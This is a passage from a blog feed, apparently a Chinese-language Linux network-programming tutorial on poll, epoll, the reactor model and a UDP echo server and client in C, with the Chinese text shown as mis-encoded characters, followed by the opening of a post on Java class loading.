class="number">0</span>;j&lt;n;j++)</span><br><span class="line">buf[j] = <span class="built_in">toupper</span>(buf[j]);</span><br><span class="line">write(i,buf,n);</span><br><span class="line">write(STDOUT_FILENO,buf,n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Close(listenfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰æ–‡ä»¶å¤´<code>wrap.h</code>å’Œå°è£…å‡½æ•°<code>wrap.c</code>ä»£ç å’Œä¹‹å‰çš„ç›¸åŒã€‚</p><h5 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd *fds, <span class="keyword">nfds_t</span> nfds,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  fds: ç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦æ•°ç»„</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span>&#123;</span></span><br><span class="line">      <span class="keyword">int</span> fd: å¾…ç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">      short events: å¾…ç›‘å¬çš„æ–‡ä»¶æè¿°ç¬¦å¯¹åº”çš„ç›‘å¬äº‹ä»¶(POLLINã€POLLOUTã€POLLERR)</span><br><span class="line">      short revents: ä¼ å…¥æ—¶ï¼Œç»™<span class="number">0</span>ã€‚å¦‚æœæ»¡è¶³å¯¹åº”äº‹ä»¶çš„è¯ï¼Œè¿”å›é<span class="number">0</span>(POLLINã€POLLOUTã€POLLERR)</span><br><span class="line">    &#125;</span><br><span class="line">  nfds: ç›‘å¬æ•°ç»„çš„ï¼Œå®é™…æœ‰æ•ˆç›‘å¬ä¸ªæ•°</span><br><span class="line">  timeout: è¶…æ—¶æ—¶é•¿</span><br><span class="line">    &gt;<span class="number">0</span>: è®¾ç½®ç›‘å¬è¶…æ—¶æ—¶é•¿</span><br><span class="line">    <span class="number">-1</span>: é˜»å¡ç›‘å¬</span><br><span class="line">    <span class="number">0</span>: éé˜»å¡ç›‘å¬ï¼Œè½®è¯¢</span><br><span class="line">è¿”å›å€¼</span><br><span class="line">    &gt;<span class="number">0</span> : æ‰€æœ‰ç›‘å¬é›†åˆä¸­ï¼Œæ»¡è¶³å¯¹åº”äº‹ä»¶çš„æ€»æ•°</span><br><span class="line">    <span class="number">0</span> : æ²¡æœ‰æ»¡è¶³ç›‘å¬æ¡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><p>readå‡½æ•°è¿”å›å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="number">0</span>: å®é™…è¯»åˆ°çš„å­—èŠ‚æ•°</span><br><span class="line">=<span class="number">0</span>: socketä¸­ï¼Œè¡¨ç¤ºå¯¹ç«¯å…³é—­ã€‚close()</span><br><span class="line"><span class="number">-1</span>: å¦‚æœerrno == EINTR è¢«å¼‚å¸¸ä¸­æ–­ï¼Œéœ€è¦é‡å¯</span><br><span class="line">  å¦‚æœerrno == EAGAINæˆ–EWOULDBLOCK ä»¥éé˜»å¡æ–¹å¼è¯»æ•°æ®ï¼Œä½†æ˜¯æ²¡æœ‰æ•°æ®ã€‚éœ€è¦å†æ¬¡è¯»</span><br><span class="line">  å¦‚æœerrno == ECONNRESET è¯´æ˜è¿æ¥è¢«é‡ç½®ï¼Œéœ€è¦close()ã€‚ç§»é™¤ç›‘å¬é˜Ÿåˆ—</span><br></pre></td></tr></table></figure><p>pollçš„ä¼˜ç‚¹ï¼š</p><ul><li><p>è‡ªå¸¦æ•°ç»„ç»“æ„ã€‚å¯ä»¥å°†ç›‘å¬äº‹ä»¶é›†åˆå’Œè¿”å›äº‹ä»¶é›†åˆåˆ†ç¦»</p></li><li><p>æ‰©å±• ç›‘å¬ä¸Šé™ï¼Œè¶…å‡º1024é™åˆ¶</p></li></ul><p>ç¼ºç‚¹</p><ul><li>ä¸èƒ½è·¨å¹³å°ã€‚åªèƒ½åœ¨Linuxä¸‹ä½¿ç”¨</li><li>æ— æ³•ç›´æ¥å®šä½æ»¡è¶³ç›‘å¬äº‹ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç¼–ç éš¾åº¦è¾ƒå¤§</li></ul><h5 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line">  size: åˆ›å»ºçš„çº¢é»‘æ ‘çš„ç›‘å¬èŠ‚ç‚¹æ•°é‡(ä»…ä¾›å†…æ ¸å‚è€ƒ)</span><br><span class="line">  è¿”å›å€¼: æŒ‡å‘æ–°åˆ›å»ºçš„çº¢é»‘æ ‘çš„æ ¹èŠ‚ç‚¹çš„fdã€‚å¤±è´¥è¿”å›<span class="number">-1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd,<span class="keyword">int</span> op,<span class="keyword">int</span> fd,struct epoll_event *event)</span></span></span><br><span class="line">  epfd: epoll_createå‡½æ•°çš„è¿”å›å€¼ epfd</span><br><span class="line">  op: å¯¹è¯¥ç›‘å¬çº¢é»‘æ ‘æ‰€åšçš„æ“ä½œ</span><br><span class="line">    EPOLL_CTL_ADD æ·»åŠ fdåˆ° ç›‘å¬çº¢é»‘æ ‘</span><br><span class="line">    EPOLL_CTL_MOD ä¿®æ”¹fdåœ¨ ç›‘å¬çº¢é»‘æ ‘ä¸Šçš„ç›‘å¬äº‹ä»¶</span><br><span class="line">    EPOLL_CTL_DEL å°†ä¸€ä¸ªfdä» ç›‘å¬çº¢é»‘æ ‘ä¸Šæ‘˜ä¸‹(å–æ¶ˆç›‘å¬)</span><br><span class="line">  fd: å¾…ç›‘å¬çš„fd</span><br><span class="line">  event: æœ¬è´¨ <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> ç»“æ„ä½“</span></span><br><span class="line"><span class="class">     <span class="title">events</span>:</span></span><br><span class="line">EPOLLINã€EPOLLOUTã€EPOLLERR</span><br><span class="line"> data: è”åˆä½“</span><br><span class="line">           <span class="keyword">int</span> fd: å¯¹åº”ç›‘å¬äº‹ä»¶çš„fd</span><br><span class="line">           <span class="keyword">void</span> *ptr</span><br><span class="line">           <span class="keyword">uint32_t</span> u32 </span><br><span class="line">           <span class="keyword">uint64_t</span> u64</span><br><span class="line"> è¿”å›å€¼: æˆåŠŸ<span class="number">0</span> å¤±è´¥è¿”å›<span class="number">-1</span> è®¾ç½®errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd,struct epoll_event *events,<span class="keyword">int</span> maxevents,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line">  epfd: epoll_createå‡½æ•°çš„è¿”å›å€¼ epfd</span><br><span class="line">  events: ä¼ å‡ºå‚æ•°ï¼Œæ•°ç»„ï¼Œæ»¡è¶³ç›‘å¬æ¡ä»¶çš„fdç»“æ„ä½“</span><br><span class="line">  maxevents: æ•°ç»„å…ƒç´ çš„æ€»ä¸ªæ•°</span><br><span class="line">  timeout: </span><br><span class="line">    &gt;<span class="number">0</span>: è®¾ç½®ç›‘å¬è¶…æ—¶æ—¶é•¿(æ¯«ç§’)</span><br><span class="line">    <span class="number">-1</span>: é˜»å¡ç›‘å¬</span><br><span class="line">    <span class="number">0</span>: éé˜»å¡ç›‘å¬ï¼Œè½®è¯¢</span><br><span class="line">  è¿”å›å€¼:</span><br><span class="line">&gt;<span class="number">0</span>: æ»¡è¶³ç›‘å¬çš„æ€»ä¸ªæ•°ï¼Œå¯ä»¥ç”¨ä½œå¾ªç¯ä¸Šé™</span><br><span class="line">     <span class="number">0</span>: æ²¡æœ‰fdæ»¡è¶³ç›‘å¬äº‹ä»¶</span><br><span class="line">    <span class="number">-1</span>: å¤±è´¥ã€‚errno</span><br></pre></td></tr></table></figure><h5 id="äº‹ä»¶æ¨¡å‹"><a href="#äº‹ä»¶æ¨¡å‹" class="headerlink" title="äº‹ä»¶æ¨¡å‹"></a>äº‹ä»¶æ¨¡å‹</h5><p>EPOLLäº‹ä»¶æœ‰ä¸¤ç§æ¨¡å‹</p><ul><li><p>Edge Triggered(ET)ï¼šè¾¹ç¼˜è§¦å‘åªæœ‰æ•°æ®åˆ°æ¥æ‰è§¦å‘ï¼Œä¸ç®¡ç¼“å­˜åŒºä¸­æ˜¯å¦è¿˜æœ‰æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">event.events = EPOLLIN | EPOLLET;</span><br></pre></td></tr></table></figure></li><li><p>Level Triggered(LT)ï¼šæ°´å¹³è§¦å‘åªè¦æœ‰æ•°æ®éƒ½ä¼šè§¦å‘</p></li></ul><h5 id="epollååº”å †æ¨¡å‹"><a href="#epollååº”å †æ¨¡å‹" class="headerlink" title="epollååº”å †æ¨¡å‹"></a>epollååº”å †æ¨¡å‹</h5><p>åŸæ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socketã€bindã€listen -- epoll_createåˆ›å»ºç›‘å¬çº¢é»‘æ ‘ -- è¿”å›epfd -- epoll_ctl()å‘æ ‘ä¸Šæ·»åŠ ä¸€ä¸ªç›‘å¬fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_waitç›‘å¬ -- å¯¹åº”ç›‘å¬fdæœ‰äº‹ä»¶äº§ç”Ÿ -- è¿”å›ç›‘å¬æ»¡è¶³æ•°ç»„ -- åˆ¤æ–­è¿”å›æ•°ç»„å…ƒç´  -- lfdæ»¡è¶³ -- Accept -- cfdæ»¡è¶³ -- read() -- å°å†™è½¬å¤§å†™ -- writeå›å»</span><br></pre></td></tr></table></figure><p>ååº”å †</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socketã€bindã€listen -- epoll_createåˆ›å»ºç›‘å¬çº¢é»‘æ ‘ -- è¿”å›epfd -- epoll_ctl()å‘æ ‘ä¸Šæ·»åŠ ä¸€ä¸ªç›‘å¬fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_waitç›‘å¬ -- å¯¹åº”ç›‘å¬fdæœ‰äº‹ä»¶äº§ç”Ÿ -- è¿”å›ç›‘å¬æ»¡è¶³æ•°ç»„ -- åˆ¤æ–­è¿”å›æ•°ç»„å…ƒç´  -- lfdæ»¡è¶³ -- Accept -- cfdæ»¡è¶³ -- read() -- å°å†™è½¬å¤§å†™ -- cfdä»ç›‘å¬çº¢é»‘æ ‘ä¸Šæ‘˜ä¸‹ -- EPOLLOUT -- å›è°ƒå‡½æ•° -- epoll_ctl() -- PEOLL_CTL_ADD é‡æ–°æ”¾åˆ°çº¢é»‘æ ‘ä¸Šç›‘å¬å†™äº‹ä»¶ -- epoll_ctl() -- EPOLL_CTL_ADD é‡æ–°æ”¾åˆ°çº¢é»‘æ ‘ä¸Šç›‘å¬è¯»äº‹ä»¶ -- epoll_waitç›‘å¬</span><br></pre></td></tr></table></figure><h4 id="UDPå¹¶å‘æœåŠ¡å™¨"><a href="#UDPå¹¶å‘æœåŠ¡å™¨" class="headerlink" title="UDPå¹¶å‘æœåŠ¡å™¨"></a>UDPå¹¶å‘æœåŠ¡å™¨</h4><p><code>server</code>ç«¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">char</span> str[INET_ADDRSTRLEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>,<span class="title">clit_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clit_addr_len;</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">lfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>); <span class="comment">//å°†tcpæµå¼åè®®æ”¹ä¸ºæŠ¥å¼åè®®</span></span><br><span class="line"><span class="keyword">if</span>(lfd == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bind(lfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Accepting connections ... \n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">clit_addr_len = <span class="keyword">sizeof</span>(clit_addr);</span><br><span class="line">ret = recvfrom(lfd,buf,BUFSIZ,<span class="number">0</span>,(struct sockaddr *)&amp;clit_addr,&amp;clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"recvfrom eror"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"received from %s at PORT %d\n"</span>,inet_ntop(AF_INET,&amp;clit_addr.sin_addr,str,<span class="keyword">sizeof</span>(str)),ntohs(clit_addr.sin_port));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">ret=sendto(lfd,buf,ret,<span class="number">0</span>,(struct sockaddr *)&amp;clit_addr,clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sendto error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(lfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>client</code>ç«¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sockfd,n;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line">sockfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bzero(&amp;servaddr,<span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;servaddr.sin_addr);</span><br><span class="line">servaddr.sin_port = htons(SERV_PORT);</span><br><span class="line"><span class="comment">//bind(sockfd,(struct sockaddr *)&amp;servaddr,sizeof(servaddr));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(fgets(buf,BUFSIZ,<span class="built_in">stdin</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">n = sendto(sockfd,buf,<span class="built_in">strlen</span>(buf),<span class="number">0</span>,(struct sockaddr *)&amp;servaddr,<span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sendto error"</span>);</span><br><span class="line">n = recvfrom(sockfd,buf,BUFSIZ,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"recvfrom error"</span>);</span><br><span class="line">write(STDOUT_FILENO,buf,n);</span><br><span class="line">&#125;</span><br><span class="line">close(sockfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Socketç¼–ç¨‹&quot;&gt;&lt;a href=&quot;#Socketç¼–ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;Socketç¼–ç¨‹&quot;&gt;&lt;/a&gt;Socketç¼–ç¨‹&lt;/h4&gt;&lt;h5 id=&quot;å¥—æ¥å­—æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#å¥—æ¥å­—æ¦‚å¿µ&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Javaç±»åŠ è½½</title>
    <link href="elssm.github.io/2021/10/30/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>elssm.github.io/2021/10/30/Javaç±»åŠ è½½/</id>
    <published>2021-10-30T14:47:18.000Z</published>
    <updated>2021-12-13T09:47:04.205Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ç±»çš„åŠ è½½æ¦‚è¿°"><a href="#ç±»çš„åŠ è½½æ¦‚è¿°" class="headerlink" title="ç±»çš„åŠ è½½æ¦‚è¿°"></a>ç±»çš„åŠ è½½æ¦‚è¿°</h4><p>æˆ‘ä»¬ç¼–å†™çš„<code>.java</code>æ‰©å±•åçš„æºä»£ç æ–‡ä»¶å­˜å‚¨ç€è¦æ‰§è¡Œçš„ç¨‹åºé€»è¾‘ï¼Œè¿™äº›æ–‡ä»¶éœ€è¦ç»è¿‡<code>java</code>ç¼–è¯‘å™¨ç¼–è¯‘æˆ<code>.class</code>æ–‡ä»¶ï¼Œ<code>.class</code>æ–‡ä»¶ä¸­å­˜æ”¾ç€ç¼–è¯‘åè™šæ‹ŸæœºæŒ‡ä»¤çš„äºŒè¿›åˆ¶ä¿¡æ¯ã€‚å½“éœ€è¦ç”¨åˆ°æŸä¸ªç±»æ—¶ï¼Œè™šæ‹Ÿæœºå°†ä¼šåŠ è½½å®ƒï¼Œå¹¶åœ¨å†…å­˜ä¸­åˆ›å»ºå¯¹åº”çš„<code>class</code>å¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¹‹ä¸ºç±»çš„åŠ è½½ã€‚ä¸€ä¸ªç±»çš„ç”Ÿå‘½å‘¨æœŸä»ç±»è¢«åŠ è½½ã€è¿æ¥å’Œåˆå§‹åŒ–å¼€å§‹ï¼Œåªæœ‰åœ¨è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œæˆ‘ä»¬çš„<code>java</code>ç¨‹åºæ‰å¯ä»¥ä½¿ç”¨å®ƒã€‚</p><p><img src="/2021/10/30/Javaç±»åŠ è½½/1.png" alt="1"></p><h5 id="ç±»çš„åŠ è½½"><a href="#ç±»çš„åŠ è½½" class="headerlink" title="ç±»çš„åŠ è½½"></a>ç±»çš„åŠ è½½</h5><p>é€šè¿‡ç±»çš„å®Œå…¨é™å®šå(åŒ…åå’Œç±»å)æŸ¥æ‰¾æ­¤ç±»çš„å­—èŠ‚ç æ–‡ä»¶ï¼ŒæŠŠç±»çš„<code>.class</code>æ–‡ä»¶ä¸­çš„äºŒè¿›åˆ¶æ•°æ®è¯»å…¥åˆ°å†…å­˜ä¸­ï¼Œå¹¶å­˜æ”¾åœ¨è¿è¡Œæ—¶æ•°æ®åŒºçš„æ–¹æ³•åŒºä¸­ï¼Œç„¶ååˆ©ç”¨å­—èŠ‚ç æ–‡ä»¶åˆ›å»ºä¸€ä¸ª<code>Class</code>å¯¹è±¡ï¼Œç”¨æ¥å°è£…ç±»åœ¨æ–¹æ³•åŒºå†…çš„æ•°æ®ç»“æ„å¹¶å­˜æ”¾åœ¨å †åŒºå†…ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ç”±ç±»åŠ è½½å™¨å®Œæˆçš„ã€‚</p><h5 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h5><ul><li>éªŒè¯ï¼šç¡®ä¿è¢«åŠ è½½ç±»çš„æ­£ç¡®æ€§ã€‚<code>Class</code>æ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºè¦æ±‚ï¼Œä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«å®‰å…¨ã€‚</li><li>å‡†å¤‡ï¼šä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ï¼Œæ­¤é˜¶æ®µä»…ä»…åªä¸ºé™æ€å˜é‡(å³<code>static</code>ä¿®é¥°çš„å­—æ®µå˜é‡)åˆ†é…å†…å­˜ï¼Œå¹¶ä¸”è®¾ç½®è¯¥å˜é‡çš„åˆå§‹å€¼ã€‚å¯¹äº<code>final static</code>ä¿®é¥°çš„å˜é‡ï¼Œç¼–è¯‘çš„æ—¶å€™å°±ä¼šåˆ†é…äº†ï¼Œä¹Ÿä¸ä¼šåˆ†é…å®ä¾‹å˜é‡çš„å†…å­˜ã€‚</li><li>è§£æï¼šæŠŠç±»ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ï¼Œç¬¦å·å¼•ç”¨å°±æ˜¯ä¸€ç»„ç¬¦å·æ¥æè¿°ç›®æ ‡ï¼Œè€Œç›´æ¥å¼•ç”¨å°±æ˜¯ç›´æ¥æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆã€ç›¸å¯¹åç§»é‡æˆ–ä¸€ä¸ªé—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚</li></ul><h5 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h5><p>ç±»åŠ 